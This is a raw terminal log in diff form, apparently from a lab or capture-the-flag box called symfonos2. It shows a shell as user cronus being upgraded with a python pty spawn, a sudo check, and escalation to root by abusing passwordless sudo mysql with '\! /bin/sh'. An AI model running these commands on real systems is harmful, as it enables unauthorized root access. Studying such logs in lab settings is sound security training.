@@ -1,0 +1,37 @@
+whoami
+cronus
+python -c "import pty;pty.spawn('/bin/bash')"
+cronus@symfonos2:/opt/librenms/html$ export TERM=xterm
+export TERM=xterm
+cronus@symfonos2:/opt/librenms/html$ ls
+ls
+ajax_dash.php         billing-graph.php   install.php
+ajax_form.php         calendar.jpg        js
+ajax_list.php         css                 legacy
+ajax_listports.php    csv.php             legacy_api_v0.php
+ajax_mapview.php      data.php            legacy_index.php
+ajax_ossuggest.php    favicon.ico         netcmd.php
+ajax_output.php       fonts               network-map.php
+ajax_rulesuggest.php  graph-realtime.php  pages
+ajax_search.php       graph.php           pdf.php
+ajax_table.php        images              plugins
+api_v0.php            includes            robots.txt
+bandwidth-graph.php   index.php
+cronus@symfonos2:/opt/librenms/html$ 
+
+cronus@symfonos2:/$ sudo -l
+sudo -l
+Matching Defaults entries for cronus on symfonos2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cronus may run the following commands on symfonos2:
+    (root) NOPASSWD: /usr/bin/mysql
+cronus@symfonos2:/$ 
+
+sudo mysql -e '\! /bin/sh' 
+# whoami
+whoami
+root
+# 
+
